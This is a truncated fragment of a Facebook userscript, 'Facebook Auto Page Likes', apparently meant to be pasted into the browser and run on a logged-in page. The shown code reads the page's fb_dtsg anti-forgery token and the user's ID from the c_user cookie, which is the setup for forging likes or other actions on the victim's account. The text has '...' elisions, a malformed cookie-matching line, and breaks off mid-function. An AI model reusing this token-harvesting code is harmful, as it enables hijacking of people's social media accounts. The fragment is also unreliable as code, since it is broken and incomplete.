// ==UserScript==
// @name            Facebook Auto  Page Likes
// @namespace       Facebook Auto Page Likes
...
//eval
javascript: var grouppost = "<div><span class='img sp_f52w7l sx_47132d'></span><a style='position:absolute;size:8px;padding-left:8px;font-weight:bold;font-family:neuropol x free;font-size:20px;color:#3669ae;'>Facebook Auto Page Likes ...</a></div></br></br>";
...
alert("» » Facebook Auto Page Likes « «"); alert("Script By : Őmĕŕ Fáŕúķ Ĵáfŕĕĕ");
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function LIST(L) {
